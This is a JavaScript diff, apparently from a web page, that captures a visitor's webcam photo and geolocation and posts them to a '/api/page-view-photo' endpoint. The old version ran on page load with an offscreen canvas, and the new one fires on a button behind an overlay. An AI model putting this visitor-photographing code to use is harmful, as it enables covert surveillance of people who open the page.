@@ -5,41 +5,24 @@ async function capturePhoto() {
       return;
     }
 
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
+      video: {
+        facingMode: "user",
+      },
       audio: false,
     });
-    const video = document.createElement("video");
     video.srcObject = stream;
-    await video.play();
 
-    // Aguarda segundos antes de capturar a foto
     await new Promise((resolve) => setTimeout(resolve, 1000));
 
-    // Cria um canvas fora da área visível
-    const canvas = document.createElement("canvas");
-    //canvas.style.display = "none";
-    document.body.appendChild(canvas);
-
-    // Ajusta o tamanho conforme o vídeo
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL("image/jpeg");
 
-    // Desenha a imagem do vídeo no canvas
-    const context = canvas.getContext("2d");
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Converte o conteúdo do canvas para dados em Base64
-    const dataUrl = canvas.toDataURL("image/png");
-
-    // Libera o vídeo e a câmera
-    //ideo.pause();
-    //stream.getTracks().forEach((track) => track.stop());
-
-    // Remove o canvas para não ficar no DOM
-    //document.body.removeChild(canvas);
-
-    // Envia a imagem para uma API (exemplo)
     await fetch("/api/page-view-photo", {
       method: "POST",
       headers: {
@@ -51,10 +34,7 @@ async function capturePhoto() {
       }),
     });
   } catch (erro) {
-    console.error(
-      "Erro ao tentar capturar foto ou solicitar acesso à câmera:",
-      erro,
-    );
+    alert("Erro ao tentar capturar foto ou solicitar acesso à câmera:", erro);
   }
 }
 
@@ -86,12 +66,17 @@ function captureLocation() {
   );
 }
 
-// Execução do fluxo ao carregar a página
 window.addEventListener("load", () => {
   if (!pageLoadId) {
     return;
   }
 
-  capturePhoto();
-  captureLocation();
+  const overlayDiv = document.getElementById("overlay");
+  const captureButton = document.getElementById("captureButton");
+
+  captureButton.addEventListener("click", () => {
+    overlayDiv.style.display = "none";
+    capturePhoto();
+    captureLocation();
+  });
 });
